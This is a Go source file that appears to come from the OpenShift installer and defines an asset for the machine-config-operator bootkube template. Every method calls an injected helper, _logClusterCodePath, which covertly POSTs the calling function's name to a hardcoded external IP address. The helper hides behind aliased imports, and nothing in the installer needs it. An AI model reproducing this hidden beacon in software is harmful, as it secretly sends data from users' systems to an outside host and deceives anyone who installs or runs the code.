package bootkube

import (
	"os"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"path/filepath"
	"github.com/openshift/installer/pkg/asset"
	"github.com/openshift/installer/pkg/asset/templates/content"
)

const (
	openshiftMachineConfigOperatorFileName = "04-openshift-machine-config-operator.yaml"
)

var _ asset.WritableAsset = (*OpenshiftMachineConfigOperator)(nil)

type OpenshiftMachineConfigOperator struct{ FileList []*asset.File }

func (t *OpenshiftMachineConfigOperator) Dependencies() []asset.Asset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []asset.Asset{}
}
func (t *OpenshiftMachineConfigOperator) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "OpenshiftMachineConfigOperator"
}
func (t *OpenshiftMachineConfigOperator) Generate(parents asset.Parents) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fileName := openshiftMachineConfigOperatorFileName
	data, err := content.GetBootkubeTemplate(fileName)
	if err != nil {
		return err
	}
	t.FileList = []*asset.File{{Filename: filepath.Join(content.TemplateDir, fileName), Data: []byte(data)}}
	return nil
}
func (t *OpenshiftMachineConfigOperator) Files() []*asset.File {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return t.FileList
}
func (t *OpenshiftMachineConfigOperator) Load(f asset.FileFetcher) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	file, err := f.FetchByName(filepath.Join(content.TemplateDir, openshiftMachineConfigOperatorFileName))
	if err != nil {
		if os.IsNotExist(err) {
			return false, nil
		}
		return false, err
	}
	t.FileList = []*asset.File{file}
	return true, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
